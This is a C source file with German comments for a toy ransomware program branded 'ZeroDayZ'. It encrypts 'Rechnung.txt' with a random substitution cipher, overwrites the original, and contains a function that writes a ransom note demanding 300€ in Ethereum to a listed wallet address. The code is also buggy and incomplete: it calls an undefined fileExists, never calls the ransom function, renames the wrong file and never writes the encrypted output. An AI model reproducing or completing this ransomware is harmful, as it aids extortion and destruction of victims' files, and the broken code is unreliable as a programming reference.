#include <stdio.h>
#include <wchar.h>
#include <locale.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>


#define MAX_TEXT_SIZE 1024
#define ALPHABET_SIZE 256 

int banner() {
    
    const char* banner[] = {
        "                                                                    ",
        ",-------.                     ,------.                   ,-------. ",
        "`--.   /  ,---. ,--.--. ,---. |  .-.  \\  ,--,--.,--. ,--.`--.   /  ",
        "  /   /  | .-. :|  .--'| .-. ||  |  \\  :' ,-.  | \\  '  /   /   /   ",
        " /   `--.\\   --.|  |   ' '-' '|  '--'  /\\ '-'  |  \\   '   /   `--. ",
        "`-------' `----'`--'    `---' `-------'  `--`--'.-'  /   `-------' ",
        "                                                `---'              "
    };

    
    int num_lines = sizeof(banner) / sizeof(banner[0]);

    
    for (int i = 0; i < num_lines; i++) {
        printf("%s\n", banner[i]);
    }

    return 0;
}


int charCounter(const char *filename){
    FILE *file;
     file = fopen(filename, "r");
     int overall = 0;
     char c;
    while (c = fgetc(file) != EOF /*EOF heißt end of file*/){ 
        ++overall; 
    }
    printf("\nInsgesamt hat die Datei %d Buchstaben", overall);

    fclose(file);
    return 0;
}
    
int fileReader (const char *filename){
    FILE *file;
     file = fopen(filename, "r");
    char line[1000]; // Buffer für eine Zeile
    while (fgets(line, sizeof(line), file) != NULL) {
        printf("%s", line); // Gibt die aktuelle Zeile aus
    }
    fclose(file);
}

int threat(){

    FILE *file;
    file = fopen("PayUp.txt", "w");
    fprintf(file, "Möchtesst du deine Datei wieder entschlüsselt haben??? \nDann sende doch 300€ in Etherium an die Cyptoadresse: \n0x742d35Cc6634C0532925a3b844Bc454e4438f44e\nVielen Dank für ihre Zusammenarbeit!!");
    fclose(file);


}

// erstellt eine Substitutionstabelle, die jedem Zeichen/Symbol einen vierstelligen Wert zuordnet
void generate_substitution_table(int sub_table[ALPHABET_SIZE], int rev_table[10000]) {
    int used_codes[10000] = {0}; // prüft ob die Zahl schon verwendet wurde

    for (int i = 0; i < ALPHABET_SIZE; i++) {
        int code;
        do {
            code = 1000 + rand() % 9000; 
        } while (used_codes[code]); 

        sub_table[i] = code;
        rev_table[code] = i;
        used_codes[code] = 1;
    }
}

// verschlüsselt den Text mit den zugeordneten vierstelligen Werten
void substitute_encrypt(const char *input, int sub_table[ALPHABET_SIZE], char *output) {
    char buffer[6]; 
    output[0] = '\0'; 

    for (size_t i = 0; i < strlen(input); i++) {
        sprintf(buffer, "%04d ", sub_table[(unsigned char)input[i]]);
        strcat(output, buffer);
    }
}
// speichert die Substitutions Tabelle
void save_substitution_table(int sub_table[ALPHABET_SIZE]) {
    FILE *table_file = fopen("substitution_table.txt", "w");
    if (table_file == NULL) {
        perror("Fehler beim Speichern der Substitutionstabelle");
        return;
    }

    fprintf(table_file, "Original-Zeichen -> Vierstellige Zahl\n");
    fprintf(table_file, "--------------------------------------\n");

    for (int i = 0; i < ALPHABET_SIZE; i++) {
        if (i >= 32 && i <= 126) { 
            fprintf(table_file, "   %c (%3d)  ->   %04d\n", i, i, sub_table[i]);
        } else {
            fprintf(table_file, "  [%3d]      ->  %04d\n", i, sub_table[i]);
        }
    }

    fclose(table_file);
}




int main() {
    setlocale(LC_ALL, "");
    const char *filename = "Rechnung.txt";
    char text[MAX_TEXT_SIZE];
    int sub_table[ALPHABET_SIZE];  // Zeichen → vierstellige Zahl
    int rev_table[10000];          // Vierstellige Zahl → Zeichen
    char encrypted[MAX_TEXT_SIZE * 5]; // Größere Speichergröße weil wir Zeichen durch vierstellige Zahlen + Leerzeichen ersetzen
    srand(time(NULL));

    banner(); //printet das Banner
    if (fileExists(filename)) {
        printf("Die Datei '%s' existiert. Verschluesselung wird gestartet...", filename);
       
        char datei[700];
        for (int i = 0 ; i <=2; ++i){
            printf("%c", '.');  
            fflush(stdout); 
            sleep(1);
        }
    // erstellt Backup der Rechnung.txt
    if (rename("Rechnung", "Rechnung_backup.txt") != 0) {
        perror("Fehler beim Erstellen des Backups. Fortfahren ohne Backup.");
    } else {
        printf("Originaldatei wurde als '%s' gespeichert.\n", filename);
    }
    
    
    // öffnet die 'Rechnung.txt'
    FILE *input_file = fopen("Rechnung_backup.txt", "rb");
    if (input_file == NULL) {
        perror("Fehler beim Öffnen der Datei 'Rechnung_backup.txt'");
        return 1;
    }

    //liest den Inhalt als text ein
    size_t text_len = fread(text, sizeof(char), MAX_TEXT_SIZE - 1, input_file);
    fclose(input_file);

     // Nullterminierung(um den String korrekt zu beenden)
     text[text_len] = '\0';

         // erstellt eine Substitutionstabelle
    generate_substitution_table(sub_table, rev_table);

    // speichert die Umkehrtabelle als 'rev_key.txt' zur späteren Entschlüsselung
    FILE *rev_key_file = fopen("rev_key.txt", "wb");
    if (rev_key_file == NULL) {
        perror("Fehler beim Speichern der Umkehr-Schlüsseldatei");
        return 1;
    }
    fwrite(rev_table, sizeof(int), 10000, rev_key_file);
    fclose(rev_key_file);

    // speichert die Substitutionstabelle als .txt
    save_substitution_table(sub_table);

    printf("Schlüssel gespeichert als 'key.txt'\n");
    printf("Umkehr-Schlüssel gespeichert als 'rev_key.txt'\n");
    printf("Substitutions-Tabelle gespeichert als 'substitution_table.txt'\n");

    // verschlüsselt den eingelesenen Text mit der Substitutionstabelle
    substitute_encrypt(text, sub_table, encrypted);

    
    // überschreibt die alte 'Rechnung.txt' mit einer neuen, leeren Version 
    FILE *enc_file = fopen("Rechnung.txt", "wb");
    if (enc_file == NULL) {
        perror("Fehler beim Öffnen der Datei zum Speichern der verschlüsselten Nachricht");
        return 1;
}

    

    return 0;
}
}
